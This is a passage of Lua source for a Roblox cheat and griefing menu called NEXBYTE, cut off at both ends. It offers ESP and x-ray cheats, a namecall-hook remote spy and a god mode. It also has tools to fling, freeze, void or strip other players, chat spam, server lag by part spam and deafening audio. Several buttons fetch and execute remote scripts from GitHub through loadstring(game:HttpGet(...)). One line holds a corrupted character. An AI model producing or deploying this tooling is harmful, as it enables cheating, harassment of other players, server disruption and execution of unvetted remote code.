                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if hum and root then
                        local pos, onScreen = cam:WorldToViewportPoint(root.Position)
                        if onScreen then
                            local bar = Drawing.new("Square")
                            bar.Size = Vector2.new(4, -100 * (hum.Health / hum.MaxHealth))
                            bar.Position = Vector2.new(pos.X + 60, pos.Y - 50)
                            bar.Color = Color3.new(1 - hum.Health/hum.MaxHealth, hum.Health/hum.MaxHealth, 0)
                            bar.Filled = true
                            bar.Visible = true
                            table.insert(_nxHp, bar)
                        end
                    end
                end
            end
        end)
    else
        if _nxHpConn then _nxHpConn:Disconnect(); _nxHpConn = nil end
        for _, h in pairs(_nxHp or {}) do if h then h:Remove() end end
        _nxHp = nil
    end
    NXNotify("HEALTH BAR ESP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="RAINBOW ESP", value=false, callback=function(v)
    if v then
        _nxRainbow = {}
        local hue = 0
        _nxRainbowConn = RunService.RenderStepped:Connect(function()
            hue = (hue + 0.01) % 1
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= Player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local hl = root:FindFirstChildOfClass("Highlight")
                        if not hl then hl = Instance.new("Highlight", root); hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end
                        hl.FillColor = Color3.fromHSV(hue, 1, 1)
                        hl.OutlineColor = Color3.fromHSV(hue, 1, 1)
                        hl.FillTransparency = 0.3
                        table.insert(_nxRainbow, hl)
                    end
                end
            end
        end)
    else
        if _nxRainbowConn then _nxRainbowConn:Disconnect(); _nxRainbowConn = nil end
        for _, hl in pairs(_nxRainbow or {}) do if hl then hl:Destroy() end end
        _nxRainbow = nil
    end
    NXNotify("RAINBOW ESP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="HIDE OTHERS (Local)", value=false, callback=function(v)
    if v then
        _nxHideOthers = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= Player and plr.Character then
                for _, part in pairs(plr.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("Decal") then
                        table.insert(_nxHideOthers, {obj = part, trans = part.LocalTransparencyModifier})
                        part.LocalTransparencyModifier = 1
                    end
                end
            end
        end
    else
        for _, entry in pairs(_nxHideOthers or {}) do
            if entry.obj and entry.obj.Parent then entry.obj.LocalTransparencyModifier = entry.trans end
        end
        _nxHideOthers = nil
    end
    NXNotify("HIDE OTHERS", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="X-RAY", value=false, callback=function(v)
    if v then
        _nxXrayParts = Workspace:GetDescendants()
        for _, p in pairs(_nxXrayParts) do
            if p:IsA("BasePart") then p.LocalTransparencyModifier = 0.8 end
        end
    else
        for _, p in pairs(_nxXrayParts or {}) do
            if p and p.Parent then p.LocalTransparencyModifier = 0 end
        end
        _nxXrayParts = nil
    end
    NXNotify("X-RAY", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="POST PROCESSING FX", callback=function()
    for _, fx in pairs({"BloomEffect", "SunRaysEffect", "ColorCorrectionEffect", "BlurEffect"}) do
        if not Lighting:FindFirstChildOfClass(fx) then
            Instance.new(fx, Lighting)
        end
    end
    NXNotify("POST FX", "Added effects")
end})

-- SERVER ULTRA
NXFeExploits:CreateSection({name="SERVER ULTRA"})

NXFeExploits:CreateButton({name="PLAYER LIST", callback=function()
    local lines = {}
    for i, p in ipairs(Players:GetPlayers()) do
        table.insert(lines, i .. ". " .. p.Name .. " (" .. tostring(p.UserId) .. ")")
    end
    print("=== PLAYERS ===\n" .. table.concat(lines, "\n"))
    NXNotify("PLAYERS", tostring(#lines) .. " online")
end})

NXFeExploits:CreateButton({name="FOLLOW PLAYER", callback=function()
    NXNotify("FOLLOW", "Select player in PLAYER tab first")
end})

NXFeExploits:CreateButton({name="ORBIT PLAYER", callback=function()
    NXNotify("ORBIT", "Select player in PLAYER tab first")
end})

NXFeExploits:CreateButton({name="FLING ONCE", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("FLING", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root then root.AssemblyLinearVelocity = Vector3.new(9e9, 9e9, 9e9) end
        end
    end
    NXNotify("FLING ONCE", "Done")
end})

NXFeExploits:CreateButton({name="VOID PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("VOID", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root then root.CFrame = CFrame.new(0, -500, 0) end
        end
    end
    NXNotify("VOID", "Done")
end})

NXFeExploits:CreateButton({name="FREEZE PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("FREEZE", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Character then
            for _, part in pairs(plr.Character:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = true end
            end
        end
    end
    NXNotify("FREEZE", "Done")
end})

NXFeExploits:CreateButton({name="UNFREEZE PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("UNFREEZE", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Character then
            for _, part in pairs(plr.Character:GetDescendants()) do
                if part:IsA("BasePart") then part.Anchored = false end
            end
        end
    end
    NXNotify("UNFREEZE", "Done")
end})

NXFeExploits:CreateButton({name="STRIP PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("STRIP", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Character then
            for _, d in pairs(plr.Character:GetDescendants()) do
                if d:IsA("Accessory") or d:IsA("Clothing") or d:IsA("Shirt") or d:IsA("Pants") then d:Destroy() end
            end
        end
    end
    NXNotify("STRIP", "Done")
end})

NXFeExploits:CreateButton({name="GIVE TOOLS TO PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("GIVE TOOLS", "Select targets first"); return end
    for _, plr in pairs(targets) do
        if plr.Backpack then
            for _, tool in pairs(Player.Backpack:GetChildren()) do
                if tool:IsA("Tool") then tool:Clone().Parent = plr.Backpack end
            end
        end
    end
    NXNotify("GIVE TOOLS", "Done")
end})

NXFeExploits:CreateButton({name="VIEW PLAYER", callback=function()
    local targets = NEXBYTE.GetSelectedTargets and NEXBYTE.GetSelectedTargets() or {}
    if #targets == 0 then NXNotify("VIEW", "Select target first"); return end
    Workspace.CurrentCamera.CameraSubject = targets[1].Character
    NXNotify("VIEW", "Viewing " .. targets[1].Name)
end})

NXFeExploits:CreateButton({name="UNVIEW", callback=function()
    Workspace.CurrentCamera.CameraSubject = Player.Character
    NXNotify("UNVIEW", "Back to self")
end})

NXFeExploits:CreateButton({name="CRASH SERVER (RemoteEvent Spam)", callback=function()
    NXNotify("CRASH", "Confirmation required - use with caution")
end})

NXFeExploits:CreateButton({name="LAG SERVER (Part Spam)", callback=function()
    for i = 1, 500 do
        local p = Instance.new("Part", Workspace)
        p.Anchored = true
        p.Position = Vector3.new(math.random(-100,100), math.random(50,200), math.random(-100,100))
        p.Size = Vector3.new(1,1,1)
        game:GetService("Debris"):AddItem(p, 5)
    end
    NXNotify("LAG SERVER", "Parts spammed")
end})

-- TROLL ULTRA
NXFeExploits:CreateSection({name="TROLL ULTRA"})

NXFeExploits:CreateToggle({name="FAKE LAG", value=false, callback=function(v)
    if v then
        _nxFakeLag = RunService.Heartbeat:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then root.CFrame = root.CFrame * CFrame.new(math.random(-5,5)/10, 0, math.random(-5,5)/10) end
        end)
    else
        if _nxFakeLag then _nxFakeLag:Disconnect(); _nxFakeLag = nil end
    end
    NXNotify("FAKE LAG", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="SPAM CHAT", value=false, callback=function(v)
    if v then
        _nxSpamChat = RunService.Heartbeat:Connect(function()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("NEXBYTE ULTIMATE ADMIN", "All")
        end)
    else
        if _nxSpamChat then _nxSpamChat:Disconnect(); _nxSpamChat = nil end
    end
    NXNotify("SPAM CHAT", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="SPAM JUMP", value=false, callback=function(v)
    if v then
        _nxSpamJump = RunService.Heartbeat:Connect(function()
            local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.Jump = true end
        end)
    else
        if _nxSpamJump then _nxSpamJump:Disconnect(); _nxSpamJump = nil end
    end
    NXNotify("SPAM JUMP", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="SPIN BOT", value=false, callback=function(v)
    if v then
        _nxSpinBot = RunService.RenderStepped:Connect(function()
            local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if root then root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(10), 0) end
        end)
    else
        if _nxSpinBot then _nxSpinBot:Disconnect(); _nxSpinBot = nil end
    end
    NXNotify("SPIN BOT", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="REMOVE FACE", callback=function()
    local head = Player.Character and Player.Character:FindFirstChild("Head")
    if head then
        local face = head:FindFirstChildOfClass("Decal")
        if face then face:Destroy() end
    end
    NXNotify("REMOVE FACE", "Done")
end})

NXFeExploits:CreateButton({name="GIANT HEAD", callback=function()
    local head = Player.Character and Player.Character:FindFirstChild("Head")
    if head then head.Size = head.Size * 3 end
    NXNotify("GIANT HEAD", "Done")
end})

NXFeExploits:CreateButton({name="TINY CHARACTER", callback=function()
    for _, part in pairs(Player.Character:GetDescendants()) do
        if part:IsA("BasePart") then part.Size = part.Size / 3 end
    end
    NXNotify("TINY CHAR", "Done")
end})

NXFeExploits:CreateButton({name="GIANT CHARACTER", callback=function()
    for _, part in pairs(Player.Character:GetDescendants()) do
        if part:IsA("BasePart") then part.Size = part.Size * 3 end
    end
    NXNotify("GIANT CHAR", "Done")
end})

NXFeExploits:CreateButton({name="FLING SELF", callback=function()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity = Vector3.new(9e9, 9e9, 9e9) end
    NXNotify("FLING SELF", "Done")
end})

NXFeExploits:CreateButton({name="ROCKET JUMP", callback=function()
    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity = Vector3.new(0, 500, 0) end
    NXNotify("ROCKET JUMP", "Done")
end})

NXFeExploits:CreateButton({name="SUPER PUNCH (Tool)", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Super Punch"
    tool.RequiresHandle = true
    local handle = Instance.new("Part", tool)
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Massless = true
    tool.Parent = Player.Backpack
    tool.Activated:Connect(function()
        local root = Player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bp = Instance.new("BodyPosition", root)
            bp.Position = root.Position + Workspace.CurrentCamera.CFrame.LookVector * 100
            bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
            game:GetService("Debris"):AddItem(bp, 0.5)
        end
    end)
    NXNotify("SUPER PUNCH", "Equip and click")
end})

NXFeExploits:CreateButton({name="EXPLOSION TOOL", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Explosion"
    tool.RequiresHandle = false
    tool.Parent = Player.Backpack
    tool.Activated:Connect(function()
        local exp = Instance.new("Explosion", Workspace)
        exp.Position = Player:GetMouse().Hit.Position
        exp.BlastRadius = 50
        exp.BlastPressure = 100000
    end)
    NXNotify("EXPLOSION TOOL", "Equip and click")
end})

NXFeExploits:CreateButton({name="BLACK HOLE TOOL", callback=function()
    local tool = Instance.new("Tool")
    tool.Name = "Black Hole"
    tool.RequiresHandle = false
    tool.Parent = Player.Backpack
    tool.Activated:Connect(function()
        local pos = Player:GetMouse().Hit.Position
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and not part.Anchored and (part.Position - pos).Magnitude < 100 then
                local bp = Instance.new("BodyPosition", part)
                bp.Position = pos
                bp.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                game:GetService("Debris"):AddItem(bp, 5)
            end
        end
    end)
    NXNotify("BLACK HOLE", "Equip and click")
end})

-- EXPERIMENTAL ULTRA
NXFeExploits:CreateSection({name="EXPERIMENTAL ULTRA"})

NXFeExploits:CreateButton({name="BACKDOOR SCANNER", callback=function()
    local suspicious = {"Require", "LoadString", "HttpGet", "HttpPost", "GetObjects", "SaveInstance"}
    local found = {}
    for _, d in pairs(game:GetDescendants()) do
        if d:IsA("Script") or d:IsA("LocalScript") or d:IsA("ModuleScript") then
            for _, s in pairs(suspicious) do
                if d.Source and string.find(d.Source, s) then
                    table.insert(found, d:GetFullName() .. ": " .. s)
                end
            end
        end
    end
    if #found > 0 then print("=== BACKDOORS ===\n" .. table.concat(found, "\n")) else NXNotify("BACKDOOR", "None found") end
end})

NXFeExploits:CreateToggle({name="REMOTE SPY (Simple)", value=false, callback=function(v)
    if v then
        _nxRemoteSpy = {}
        local mt = getrawmetatable(game)
        local old = mt.__namecall
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "FireServer" or method == "InvokeServer" then
                table.insert(_nxRemoteSpy, {remote = self:GetFullName(), method = method, args = {...}})
            end
            return old(self, ...)
        end)
        setreadonly(mt, true)
    else
        NXNotify("REMOTE SPY", "Captured " .. tostring(#(_nxRemoteSpy or {})) .. " calls")
    end
end})

NXFeExploits:CreateButton({name="LOAD DARK DEX", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/DarkDex.lua"))() end)
    NXNotify("DARK DEX", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD SIMPLE SPY", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))() end)
    NXNotify("SIMPLE SPY", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD HYDROXIDE", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydroxide-Rewrite/Hydroxide/main/init.lua"))() end)
    NXNotify("HYDROXIDE", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD INFINITE YIELD", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
    NXNotify("INFINITE YIELD", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD CMD-X", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))() end)
    NXNotify("CMD-X", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD DOMAIN X", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DomainX/DomainX/main/Source"))() end)
    NXNotify("DOMAIN X", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD HOMEBREW ADMIN", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/ltseverydayyou/main/HomebrewAdmin.lua"))() end)
    NXNotify("HOMEBREW", "Loading...")
end})

NXFeExploits:CreateButton({name="LOAD NAMELESS ADMIN", callback=function()
    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))() end)
    NXNotify("NAMELESS", "Loading...")
end})

-- AUTOMATION ULTRA
NXFeExploits:CreateSection({name="AUTOMATION ULTRA"})

NXFeExploits:CreateToggle({name="AUTO FARM (Generic)", value=false, callback=function(v)
    if v then
        _nxAutoFarm = RunService.Heartbeat:Connect(function()
            for _, d in pairs(Workspace:GetDescendants()) do
                if d:IsA("ProximityPrompt") then
                    fireproximityprompt(d)
                end
            end
        end)
    else
        if _nxAutoFarm then _nxAutoFarm:Disconnect(); _nxAutoFarm = nil end
    end
    NXNotify("AUTO FARM", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="AUTO COLLECT (Generic)", value=false, callback=function(v)
    if v then
        _nxAutoCollect = RunService.Heartbeat:Connect(function()
            local root = Player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                for _, d in pairs(Workspace:GetDescendants()) do
                    if d:IsA("Tool") or d:IsA("BasePart") and d.Name:lower():find("coin") then
                        d.CFrame = root.CFrame
                    end
                end
            end
        end)
    else
        if _nxAutoCollect then _nxAutoCollect:Disconnect(); _nxAutoCollect = nil end
    end
    NXNotify("AUTO COLLECT", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="AUTO SELL (Generic)", value=false, callback=function(v)
    NXNotify("AUTO SELL", "Game-specific")
end})

NXFeExploits:CreateToggle({name="AUTO BUY (Generic)", value=false, callback=function(v)
    NXNotify("AUTO BUY", "Game-specific")
end})

NXFeExploits:CreateToggle({name="AUTO QUEST (Generic)", value=false, callback=function(v)
    NXNotify("AUTO QUEST", "Game-specific")
end})

NXFeExploits:CreateToggle({name="AUTO REBIRTH (Generic)", value=false, callback=function(v)
    NXNotify("AUTO REBIRTH", "Game-specific")
end})

NXFeExploits:CreateToggle({name="AUTO PRESTIGE (Generic)", value=false, callback=function(v)
    NXNotify("AUTO PRESTIGE", "Game-specific")
end})

NXFeExploits:CreateButton({name="WALK TO MOUSE", callback=function()
    local root = Player.Character:FindFirstChild("HumanoidRootPart")
    local hum = Player.Character:FindFirstChildOfClass("Humanoid")
    local mouse = Player:GetMouse()
    if root and hum and mouse.Hit then
        hum:MoveTo(mouse.Hit.Position)
    end
    NXNotify("WALK TO MOUSE", "Moving")
end})

NXFeExploits:CreateButton({name="PATHFIND TO SELECTED", callback=function()
    NXNotify("PATHFIND", "Select target in PLAYER tab")
end})

-- AUDIO ULTRA
NXFeExploits:CreateSection({name="AUDIO ULTRA"})

NXFeExploits:CreateButton({name="PLAY SOUND", callback=function()
    local sound = Instance.new("Sound", Workspace)
    sound.SoundId = "rbxassetid://142376088"
    sound.Volume = 10
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 5)
    NXNotify("SOUND", "Played")
end})

NXFeExploits:CreateButton({name="LOOP SOUND", callback=function()
    local sound = Instance.new("Sound", Workspace)
    sound.SoundId = "rbxassetid://142376088"
    sound.Volume = 10
    sound.Looped = true
    sound:Play()
    _nxLoopSound = sound
    NXNotify("LOOP SOUND", "Playing")
end})

NXFeExploits:CreateButton({name="STOP ALL SOUNDS", callback=function()
    for _, s in pairs(Workspace:GetDescendants()) do
        if s:IsA("Sound") then s:Stop(); s:Destroy() end
    end
    if _nxLoopSound then _nxLoopSound:Stop(); _nxLoopSound = nil end
    NXNotify("STOP SOUNDS", "Done")
end})

NXFeExploits:CreateToggle({name="MUTE ALL", value=false, callback=function(v)
    if v then
        _nxMuteVol = {}
        for _, s in pairs(Workspace:GetDescendants()) do
            if s:IsA("Sound") then table.insert(_nxMuteVol, {s = s, vol = s.Volume}); s.Volume = 0 end
        end
    else
        for _, entry in pairs(_nxMuteVol or {}) do
            if entry.s and entry.s.Parent then entry.s.Volume = entry.vol end
        end
        _nxMuteVol = nil
    end
    NXNotify("MUTE ALL", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="EAR RAPE (WARNING)", callback=function()
    local sound = Instance.new("Sound", Workspace)
    sound.SoundId = "rbxassetid://142376088"
    sound.Volume = 1000
    sound.Looped = true
    sound:Play()
    _nxEarRape = sound
    NXNotify("EAR RAPE", "WARNING: EXTREME VOLUME")
end})

-- EXPLOIT ULTRA
NXFeExploits:CreateSection({name="EXPLOIT ULTRA"})

NXFeExploits:CreateButton({name="GET EXECUTOR NAME", callback=function()
    local name = "Unknown"
    if getexecutorname then name = getexecutorname() end
    NXNotify("EXECUTOR", name)
end})

NXFeExploits:CreateButton({name="GET EXPLOIT LEVEL", callback=function()
    local level = "Unknown"
    if getexecutorlevel then level = tostring(getexecutorlevel()) end
    NXNotify("LEVEL", level)
end})

NXFeExploits:CreateButton({name="CHECK FUNCTIONS", callback=function()
    local funcs = {}
    for k, v in pairs(getgenv()) do if type(v) == "function" then table.insert(funcs, k) end end
    table.sort(funcs)
    print("=== FUNCTIONS ===\n" .. table.concat(funcs, "\n"))
    NXNotify("FUNCTIONS", tostring(#funcs) .. " found")
end})

NXFeExploits:CreateButton({name="UNLOCK FPS", callback=function()
    if setfpscap then setfpscap(999) end
    NXNotify("FPS UNLOCK", "Set to 999")
end})

NXFeExploits:CreateButton({name="GET NIL INSTANCES", callback=function()
    local count = 0
    if getnilinstances then count = #getnilinstances() end
    NXNotify("NIL INSTANCES", tostring(count))
end})

NXFeExploits:CreateButton({name="HIDDEN PROPERTIES", callback=function()
    if gethiddenproperty then NXNotify("HIDDEN PROP", "Supported") else NXNotify("HIDDEN PROP", "Not supported") end
end})

-- MISC ULTRA
NXFeExploits:CreateSection({name="MISC ULTRA"})

NXFeExploits:CreateButton({name="RESET CHARACTER", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Health = 0 end
    NXNotify("RESET", "Done")
end})

NXFeExploits:CreateButton({name="RESPAWN AT SPAWN", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Health = 0 end
    NXNotify("RESPAWN", "Done")
end})

NXFeExploits:CreateButton({name="SIT", callback=function()
    local hum = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.Sit = true end
    NXNotify("SIT", "Done")
end})

NXFeExploits:CreateButton({name="SEND CHAT", callback=function()
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("NEXBYTE ULTIMATE ADMIN", "All")
    NXNotify("CHAT", "Sent")
end})

NXFeExploits:CreateButton({name="WHISPER", callback=function()
    NXNotify("WHISPER", "Select target in PLAYER tab")
end})

NXFeExploits:CreateToggle({name="ANTI CHAT LOG", value=false, callback=function(v)
    NXNotify("ANTI CHAT LOG", "Game-specific")
end})

NXFeExploits:CreateButton({name="REJOIN", callback=function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
    NXNotify("REJOIN", "Teleporting...")
end})

NXFeExploits:CreateButton({name="SERVER HOP", callback=function()
    local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
    for _, s in pairs(servers.data) do
        if s.playing < s.maxPlayers and s.id ~= game.JobId then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, s.id, Player)
            break
        end
    end
    NXNotify("SERVER HOP", "Hopping...")
end})

NXFeExploits:CreateButton({name="FPS BOOST", callback=function()
    for _, d in pairs(Workspace:GetDescendants()) do
        if d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Smoke") or d:IsA("Fire") or d:IsA("Sparkles") then d:Destroy() end
    end
    Lighting.GlobalShadows = false
    settings().Rendering.QualityLevel = 1
    NXNotify("FPS BOOST", "Applied")
end})

NXFeExploits:CreateButton({name="DELETE MAP (Local)", callback=function()
    for _, d in pairs(Workspace:GetDescendants()) do
        if d:IsA("BasePart") and not d:IsDescendantOf(Player.Character) then d:Destroy() end
    end
    NXNotify("DELETE MAP", "Local only")
end})

NXFeExploits:CreateButton({name="CLEAR TERRAIN (Local)", callback=function()
    Workspace.Terrain:Clear()
    NXNotify("CLEAR TERRAIN", "Done")
end})

NXFeExploits:CreateToggle({name="NO FOG", value=false, callback=function(v)
    if v then _nxOldFog = Lighting.FogEnd; Lighting.FogEnd = 100000 else if _nxOldFog then Lighting.FogEnd = _nxOldFog end end
    NXNotify("NO FOG", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="PLAY ANIMATION", callback=function()
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://507732009"
    local animator = Player.Character:FindFirstChild("Animator")
    if animator then animator:LoadAnimation(anim):Play() end
    NXNotify("ANIMATION", "Playing")
end})

NXFeExploits:CreateButton({name="STOP ANIMATION", callback=function()
    local animator = Player.Character:FindFirstChild("Animator")
    if animator then for _, tr in pairs(animator:GetPlayingTracks()) do tr:Stop() end end
    NXNotify("STOP ANIM", "Done")
end})

NXFeExploits:CreateButton({name="GET ALL TOOLS", callback=function()
    for _, d in pairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("Tool") then d:Clone().Parent = Player.Backpack end
    end
    NXNotify("GET TOOLS", "Done")
end})

NXFeExploits:CreateButton({name="DELETE ALL TOOLS", callback=function()
    local count = 0
    for _, d in pairs(Player.Backpack:GetChildren()) do if d:IsA("Tool") then d:Destroy(); count = count + 1 end end
    for _, d in pairs(Player.Character:GetChildren()) do if d:IsA("Tool") then d:Destroy(); count = count + 1 end end
    NXNotify("DELETE TOOLS", tostring(count) .. " removed")
end})

NXFeExploits:CreateButton({name="REMOVE TOOL COOLDOWNS", callback=function()
    for _, d in pairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("Tool") then for _, cd in pairs(d:GetDescendants()) do if cd:IsA("ValueRange") or cd:IsA("NumberValue") then cd.Value = 0 end end end
    end
    NXNotify("REMOVE CD", "Done")
end})

NXFeExploits:CreateButton({name="AUTO EQUIP BEST", callback=function()
    local best = nil
    for _, t in pairs(Player.Backpack:GetChildren()) do
        if t:IsA("Tool") and (not best or (t:FindFirstChild("Damage") and t.Damage.Value > best.Damage.Value)) then best = t end
    end
    if best then best.Parent = Player.Character; NXNotify("AUTO EQUIP", best.Name) else NXNotify("AUTO EQUIP", "None found") end
end})

NXFeExploits:CreateButton({name="FLING ALL (Uncontrolled)", callback=function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= Player and plr.Character then
            local root = plr.Character:FindFirstChild("HumanoidRootPart")
            if root then root.AssemblyLinearVelocity = Vector3.new(math.random(-1000,1000), math.random(-1000,1000), math.random(-1000,1000)) end
        end
    end
    NXNotify("FLING ALL", "Done")
end})

NXFeExploits:CreateToggle({name="BLACK HOLE (Parts)", value=false, callback=function(v)
    if v then
        _nxBh = RunService.Heartbeat:Connect(function()
            local root = Player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                for _, part in pairs(Workspace:GetDescendants()) do
                    if part:IsA("BasePart") and not part.Anchored and not part:IsDescendantOf(Player.Character) and (part.Position - root.Position).Magnitude < 50 then
                        part.AssemblyLinearVelocity = (root.Position - part.Position).Unit * 100
                    end
                end
            end
        end)
    else
        if _nxBh then _nxBh:Disconnect(); _nxBh = nil end
    end
    NXNotify("BLACK HOLE", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="EARTHQUAKE (Screen)", value=false, callback=function(v)
    if v then
        _nxEq = RunService.RenderStepped:Connect(function()
            local cam = Workspace.CurrentCamera
            cam.CFrame = cam.CFrame * CFrame.new(math.random(-5,5)/10, math.random(-5,5)/10, 0)
        end)
    else
        if _nxEq then _nxEq:Disconnect(); _nxEq = nil end
    end
    NXNotify("EARTHQUAKE", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="RAINBOW CHARACTER", value=false, callback=function�(v)
    if v then
        _nxRainbowChar = RunService.RenderStepped:Connect(function()
            for _, part in pairs(Player.Character:GetDescendants()) do
                if part:IsA("BasePart") then part.Color = Color3.fromHSV((tick() * 0.5) % 1, 1, 1) end
            end
        end)
    else
        if _nxRainbowChar then _nxRainbowChar:Disconnect(); _nxRainbowChar = nil end
        for _, part in pairs(Player.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.Color = Color3.new(1, 1, 1) end
        end
    end
    NXNotify("RAINBOW CHAR", v and "ON" or "OFF")
end})

NXFeExploits:CreateToggle({name="GOD MODE (Local)", value=false, callback=function(v)
    if v then
        _nxGod = RunService.Heartbeat:Connect(function()
            local hum = Player.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.MaxHealth = math.huge; hum.Health = math.huge end
        end)
    else
        if _nxGod then _nxGod:Disconnect(); _nxGod = nil end
        local hum = Player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.MaxHealth = 100; hum.Health = 100 end
    end
    NXNotify("GOD MODE", v and "ON" or "OFF")
end})

NXFeExploits:CreateButton({name="CRASH SERVER (RemoteEvent Spam)", callback=function()
    NXNotify("CRASH", "Use with caution")
end})

NXFeExploits:CreateButton({name="LAG SERVER (Part Spam)", callback=function()
    for i = 1, 500 do
        local p = Instance.new("Part", Workspace)
        p.Anchored = true
        p.Position = Vector3.new(math.random(-100,100), math.random(50,200), math.random(-100,100))
        p.Size = Vector3.new(1,1,1)
        game:GetService("Debris"):AddItem(p, 5)
    end
    NXNotify("LAG SERVER", "Parts spammed")
end})
-- =====================================================
-- LOGS TAB
-- =====================================================
local NXLogs = NXWindow:CreateTab({name="LOGS", icon="history"})
NXLogs:CreateSection({name="ACTION LOGS"})

NXLogs:CreateButton({name="SHOW LOGS", callback=function()
    local logText = ""
    for _, entry in ipairs(NEXBYTE._LOGS) do
        logText = logText .. string.format("[%s] [%s] %s\n", os.date("%H:%M:%S", entry.time), entry.level:upper(), entry.message)
    end
    print("=== NEXBYTE LOGS ===\n" .. logText)
    NXNotify("LOGS", "Logs printed to console (F9)")
end})

NXLogs:CreateButton({name="CLEAR LOGS", callback=function()
